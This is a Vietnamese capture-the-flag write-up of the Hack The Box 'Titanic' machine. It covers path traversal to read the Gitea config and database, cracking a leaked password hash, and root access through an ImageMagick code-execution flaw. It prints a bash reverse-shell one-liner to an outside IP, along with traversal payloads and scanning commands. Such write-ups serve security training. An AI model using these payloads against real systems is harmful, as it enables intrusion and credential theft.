# Titanic

<img width="1269" height="731" alt="image" src="https://github.com/user-attachments/assets/d158d581-79c8-4a72-852b-e1fe6782e454" />

Đầu tiên thì tôi dùng `nmap -sV -T5 -p- 10.10.11.55 ` quét qua qua các port và thu được 2 port là 80 và 22 lần lượt là http và ssh:

<img width="1027" height="253" alt="image" src="https://github.com/user-attachments/assets/3598286d-6b94-4553-98c9-5b3df515c11d" />

Vào http thì dẫn đến 1 trang book vé, có thể điền thông tin và book vé:

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/33ff9070-4c96-480f-aa90-df67cd475da6" />

<img width="675" height="623" alt="image" src="https://github.com/user-attachments/assets/667fecda-e0f3-4839-b671-0bcd2d66ede6" />

Sau khi điền thông tin và bấm gửi thì sẽ tải về file json có chứa thông tin tôi vừa nhập:

<img width="1401" height="804" alt="image" src="https://github.com/user-attachments/assets/7bb3fdea-cb2e-442f-b034-c4e0ee7accbd" />

Có thể thấy param ticket nhận tên file và trả về nội dung của file, tôi thử với `../../../../../etc/passwd` xem như nào 

<img width="1357" height="753" alt="image" src="https://github.com/user-attachments/assets/2b76e004-6e3d-4f30-8ee8-63d20ca9434c" />

Và xuất hiện lỗ hổng path traversal, biết được lỗ hổng nhưng chưa biết được trong server có file gì để đọc tiếp, tôi tiếp tục khám phá website

Tôi có thử fuzz qua directory thì không được cái gì, fuzz subdomain thì ra được cái `http://dev.titanic.htb/`
```
ffuf -u http://10.10.11.55/ -H 'Host: FUZZ.titanic.htb' -w subdomains-top1mil-20000.txt -mc 200,301,302,307,401,403 -ac -t 100 -timeout 2 -rate 50
```
<img width="1543" height="579" alt="image" src="https://github.com/user-attachments/assets/46730e73-1eae-4006-9fe2-be29ad364227" />

Đây là giao diện khi truy cập vào `http://dev.titanic.htb/`:

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/baddfffe-d6a5-4b61-af8e-f6afa0b2b7b8" />

Tôi dùng gospider thì tìm được một số cái repo:
```
gospider -s "http://dev.titanic.htb/" -o output -c 10 -d 1
```
<img width="1782" height="771" alt="image" src="https://github.com/user-attachments/assets/a73bc35b-4ab0-413e-9d30-83695bf96fe3" />

Có 2 repo đáng chú ý, cái trên cùng tên aaa là tôi tạo nên không cần quan tâm lắm:

<img width="1510" height="359" alt="image" src="https://github.com/user-attachments/assets/7a75216a-75b5-427f-95ad-e0fa9b308c90" />

Ở cái `flask-app` thì là src code của website book vé kia

<img width="1489" height="828" alt="image" src="https://github.com/user-attachments/assets/d2523aae-9afc-4a19-aac6-c3a5c566fc8a" />

Ở cái `docker-config` thì gồm có 2 file docker compose của gitea và mysql:

<img width="1427" height="610" alt="image" src="https://github.com/user-attachments/assets/e84b72e4-1567-47a0-82b1-7651b8e38ffd" />

Trong mysql thì phải kết nối vào mới dùng được, cơ mà thu được mật khẩu của mysql:
```
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
```

Ở docker của gitea thì có đường dẫn là `/home/developer/gitea/data`, có thể khai thác được path traversal:
```
YAML
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
Theo như search trên mạng thì tệp `app.ini` là tệp chứa các thông tin config của gitea:
<img width="1323" height="672" alt="image" src="https://github.com/user-attachments/assets/3ac58ed6-aa5c-45c0-958a-981eabca62d6" />

Tôi tải về máy đoạn docker compose này và sửa thành thư mục `/tmp/data` để cho dễ hình dung:
```
◄ 0s ◎ cat gitea/docker-compose.yml                                                                                                   □ road_to_hecker_lord/docker-config 15:34
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /tmp/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
```
Và có thể tìm được vị trí của tệp `app.ini` là `/home/developer/gitea/data/gitea/conf/app.ini` 

<img width="673" height="163" alt="image" src="https://github.com/user-attachments/assets/a0fa1b88-68aa-4122-a244-09eaab36b607" />

Và tìm được đường dẫn đến database:

<img width="1339" height="624" alt="image" src="https://github.com/user-attachments/assets/a80432d5-36f7-4ae8-9c75-0a7828edffef" />

<img width="1488" height="792" alt="image" src="https://github.com/user-attachments/assets/9d3e76a0-5593-462b-9149-3738dde63247" />

Sau khi dump cái file database đó ra bằng sqlite3 thì ra được hash của mật khẩu admin và developer:

<img width="1778" height="749" alt="image" src="https://github.com/user-attachments/assets/79754cf4-27dd-4a24-b64b-433240a17b00" />

Mật khẩu này được hash là `passwd_hash_algo: pbkdf2$50000$50`, tôi đã nhờ chatgpt đưa về dạng có thể đưa vào hashcat được:

<img width="1021" height="461" alt="image" src="https://github.com/user-attachments/assets/038f64bf-2f79-4520-88f8-6e093f5b729f" />

Sau 1 lúc chạy hashcat thì tìm được mật khẩu của developer là `25282528`

<img width="1259" height="81" alt="image" src="https://github.com/user-attachments/assets/44310fca-a4ec-4b01-8fb1-240175e55ce0" />

Sử dụng ssh kết nối vào server với user là developer:

<img width="609" height="225" alt="image" src="https://github.com/user-attachments/assets/47c69db0-e548-4f03-8de9-2722c86134cc" />

Kết nối vào rồi thì không tìm được cái gì, khá khoai cho đến khi tôi liếc 1 chút qua hint là xem trong thư mục `/opt/`, vào đó check thì có 3 thư mục 

<img width="628" height="198" alt="image" src="https://github.com/user-attachments/assets/18910227-4ef8-43ee-966e-c31a7e57a13d" />```
Trong thư mục `/script/` thì có file `.sh` chạy đoạn này:
```
developer@titanic:~$ cat /opt/scripts/identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
Đoạn này `cd /opt/app/static/assets/images` sau đó xóa sạch nội dung của `metadata.log` rồi tìm tất cả các file có đuôi `.jpg` ở cuối trong `/opt/app/static/assets/images/` 
sau đó lấy danh sách vừa tìm được truyền vào `/usr/bin/magick identify` và lưu vào file `metadata.log`

Truy cập vào `/opt/app/static/assets/images/` thì thấy tệp `metadata.log` được làm mới liên tục, điều đó chứng tỏ script `identify_images.sh` được chạy liên tục với quyền root, 
do kiểm tra tiến trình bên developer thì không có thấy:

<img width="807" height="325" alt="image" src="https://github.com/user-attachments/assets/aef1410e-c287-48fa-8a36-ccab568217bd" />

Check version của magick thì ra `ImageMagick 7.1.1-35 ` 

<img width="1373" height="184" alt="image" src="https://github.com/user-attachments/assets/23601417-9314-46e9-b7b1-84e9b6d32ad2" />

Search google với từ khóa `imagemagick 7.1.1-35 exploits` thì có thể thấy phiên bản này dính lỗi ACE(Arbitrary Code Execution), xem thêm tại [đây](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

<img width="1016" height="833" alt="image" src="https://github.com/user-attachments/assets/ae5b604f-fe59-4e11-a737-29537e99fea1" />

Có thể thấy ở đây tạo 1 tệp xml và dùng magick để thực thi lệnh bên trong tệp xml đó:

<img width="1139" height="543" alt="image" src="https://github.com/user-attachments/assets/ba305792-0864-4eb3-bc5b-64ee2699ae6c" />

Chạy theo lệnh script hơi lỗi tí nhưng vẫn chạy được:

<img width="1447" height="164" alt="image" src="https://github.com/user-attachments/assets/9fccbedf-ee3a-4396-8f44-20e7127e58f3" />

Nhưng tôi đang cần jpg vì đoạn script kia nhận mấy file có đuôi jpg, khi chuyển sang jpg thì không chạy được:

<img width="1026" height="78" alt="image" src="https://github.com/user-attachments/assets/f1644110-bf04-4f71-aa73-4ae285c5c523" />

Lướt xuống dưới của cái link github kia thì có đoạn khai thác `LD_LIBRARY_PATH`, thêm nó vào là chạy được và không xảy ra lỗi:

<img width="1059" height="306" alt="image" src="https://github.com/user-attachments/assets/ee5a76ca-8035-4f95-a0ff-b2d629db6122" />

Sửa thành reverse shell và ngồi đợi script kia chạy để kết nối vào:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.15/1234 0>&1'
```
<img width="992" height="312" alt="image" src="https://github.com/user-attachments/assets/7c314cd8-ab9e-41a3-9ee4-7ab52640cd5c" />

<img width="901" height="265" alt="image" src="https://github.com/user-attachments/assets/a6909882-b41b-4a29-928e-8e8fc9b25175" />

